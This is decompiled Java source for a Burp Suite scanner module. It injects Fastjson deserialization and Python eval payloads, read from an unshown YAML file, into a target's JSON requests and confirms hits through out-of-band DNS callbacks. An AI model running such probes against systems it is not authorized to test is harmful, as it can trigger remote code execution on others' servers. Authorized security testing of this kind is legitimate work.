//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package modules;

import burp.*;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import commmon.CommonUtils;
import commmon.Tweb;
import commmon.YamlTools;
import core.Config;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

public class JsonPollution {
  private final List<String> headers;
  private static String host = null;
  private static URL url;
  private final IHttpService iHttpService;
  public ArrayList<String> fastjsonPayloads = new ArrayList();
  public ArrayList<String> pythonPayloads = new ArrayList();

  public JsonPollution(IHttpRequestResponse baseRequestResponse) {
    this.headers = BurpExtender.helpers.analyzeRequest(baseRequestResponse).getHeaders();
    url = BurpExtender.helpers.analyzeRequest(baseRequestResponse).getUrl();
    this.iHttpService = baseRequestResponse.getHttpService();
    host = this.iHttpService.getHost();
    YamlTools yaml = new YamlTools(Config.YAML_PATH);
    String[] var3 = ((HashMap)yaml.getValueByKey("jsonPollution", new HashMap())).get("allin").toString().split("\n");
    int var4 = var3.length;

    int var5;
    String payload;
    for(var5 = 0; var5 < var4; ++var5) {
      payload = var3[var5];
      this.fastjsonPayloads.add(payload);
    }

    var3 = ((HashMap)yaml.getValueByKey("jsonPollution", new HashMap())).get("value").toString().split("\n");
    var4 = var3.length;

    for(var5 = 0; var5 < var4; ++var5) {
      payload = var3[var5];
      this.pythonPayloads.add(payload);
    }

    String status = ((HashMap)yaml.getValueByKey("jsonPollution", new HashMap())).get("status").toString().trim();
    if (status.equals("true")) {
      this.fastjsonCheck();
      this.pythonEvalCheck(baseRequestResponse);
    }

  }

  public void fastjsonCheck() {
    Iterator var1 = this.fastjsonPayloads.iterator();

    while(var1.hasNext()) {
      final Object payload = var1.next();
      Thread thread = new Thread(new Runnable() {
        public void run() {
          String key = CommonUtils.getRandomString(6);
          String dnslog = String.format("%s.%s.fastjson.%s", key, JsonPollution.host, (new Tweb()).getDomain());
          String tmp = payload.toString().replaceAll("dnslog", dnslog).trim().replaceAll("\r|\n", "");
          byte[] postMessage = BurpExtender.helpers.buildHttpMessage(JsonPollution.this.headers, BurpExtender.helpers.stringToBytes(tmp));
          IHttpRequestResponse resp = BurpExtender.callbacks.makeHttpRequest(JsonPollution.this.iHttpService, postMessage);

          try {
            Thread.sleep((long)Config.TIMEOUT);
          } catch (Exception var7) {
          }

          String dnsresp = (new Tweb()).getlog(key);
          if (!dnsresp.isEmpty()) {
            BurpExtender.callbacks.addScanIssue(new CustomScanIssue(JsonPollution.this.iHttpService, JsonPollution.url, new IHttpRequestResponse[]{resp}, "Fastjson", String.format("<strong>tweb</strong>:\n\n%s", dnsresp), "High"));
            BurpExtender.stdout.println("======================================================================================");
            BurpExtender.stdout.println("======================================Fastjson Found==================================");
            BurpExtender.stdout.println("======================================================================================");
            BurpExtender.stdout.println(dnsresp);
            BurpExtender.stdout.println("======================================================================================\n");
          }

        }
      });
      thread.start();
    }

  }

  public void pythonEvalCheck(IHttpRequestResponse baseRequestResponse) {
    byte[] request = baseRequestResponse.getRequest();
    IRequestInfo requestInfo = BurpExtender.helpers.analyzeRequest(request);
    int bodyOffset = requestInfo.getBodyOffset();
    int body_length = request.length - bodyOffset;
    final byte[] byteBody = new byte[body_length];
    System.arraycopy(request, bodyOffset, byteBody, 0, body_length);
    BurpExtender.stdout.println(new String(byteBody));
    Iterator var7 = this.pythonPayloads.iterator();

    while(var7.hasNext()) {
      final Object payload = var7.next();
      Thread thread = new Thread(new Runnable() {
        public void run() {
          BurpExtender.stdout.println(new String(byteBody));
          String key = CommonUtils.getRandomString(6);
          String dnslog = String.format("%s.%s.pythoneval.%s", key, JsonPollution.host, (new Tweb()).getDomain());
          String tmp = payload.toString().replaceAll("dnslog", dnslog).trim().replaceAll("\r|\n", "");
          String res = "";

          String dnsresp;
          try {
            JsonParser p = new JsonParser();
            JsonElement e = p.parse(new String(byteBody));
            res = CommonUtils.jsonPollution(e.toString(), tmp);

            for(dnsresp = String.format("\"%s\"", tmp); res.contains(dnsresp); res = res.replace(dnsresp, tmp)) {
            }

            if (payload.toString().startsWith("\"") && payload.toString().endsWith("\"")) {
              for(String replaceStr2 = "\\\""; res.contains(replaceStr2); res = res.replace(replaceStr2, "")) {
              }
            }
          } catch (Exception var10) {
            var10.printStackTrace();
          }

          BurpExtender.stdout.println(res);
          byte[] postMessage = BurpExtender.helpers.buildHttpMessage(JsonPollution.this.headers, BurpExtender.helpers.stringToBytes(res));
          IHttpRequestResponse resp = BurpExtender.callbacks.makeHttpRequest(JsonPollution.this.iHttpService, postMessage);

          try {
            Thread.sleep((long)Config.TIMEOUT);
          } catch (Exception var9) {
          }

          dnsresp = (new Tweb()).getlog(key);
          if (!dnsresp.isEmpty()) {
            BurpExtender.callbacks.addScanIssue(new CustomScanIssue(JsonPollution.this.iHttpService, JsonPollution.url, new IHttpRequestResponse[]{resp}, "Python Code Eval", String.format("<strong>payload</strong>:<br>%s<br><strong>dnslog</strong>:<br>%s", tmp, dnsresp), "High"));
            BurpExtender.stdout.println("======================================================================================");
            BurpExtender.stdout.println("=======================================Flask Found====================================");
            BurpExtender.stdout.println("======================================================================================");
            BurpExtender.stdout.println(dnsresp);
            BurpExtender.stdout.println("======================================================================================\n");
          }

        }
      });
      thread.start();
    }

  }
}
